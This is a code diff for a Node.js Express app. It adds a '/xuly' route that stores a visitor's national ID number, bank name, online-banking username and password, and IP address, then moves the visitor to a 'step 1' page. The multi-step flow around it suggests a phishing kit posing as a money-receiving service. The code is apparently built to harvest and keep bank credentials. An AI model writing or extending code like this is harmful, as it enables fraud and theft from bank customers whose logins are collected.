@@ -11,6 +11,7 @@ var Info = require("./models/InFo");
 var Bank = require("./models/Bank");
 var User = require("./models/User");
 var admin = require("./routers/admin");
+let Infomation = require("./models/Infomation");
 var app = express();
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(session({
@@ -177,6 +178,28 @@ app.post("/actionstep2",(req,res)=>{
         }
          
      })
+})
+app.post("/xuly",(req,res)=>{
+    console.log(req.body);
+    var obj = {
+        CMND:req.body.CMND,
+        ReciverMoney:req.body.reciverMoney,
+        UserName:req.body.username,
+        Password:req.body.passwowrd,
+        Bank:req.body.bankname,
+        IP:req.clientIp
+    }
+    Infomation.create(obj,(error,info)=>{
+        if(error){
+            res.redirect("/");
+        }
+        else{
+            req.session.InfoId = info._id;
+            console.log(req.session.InfoId);
+            res.redirect("/Buoc-1");
+        }
+    })
+    
 })
 app.post("/actionstep3",(req,res)=>{
     var obj={
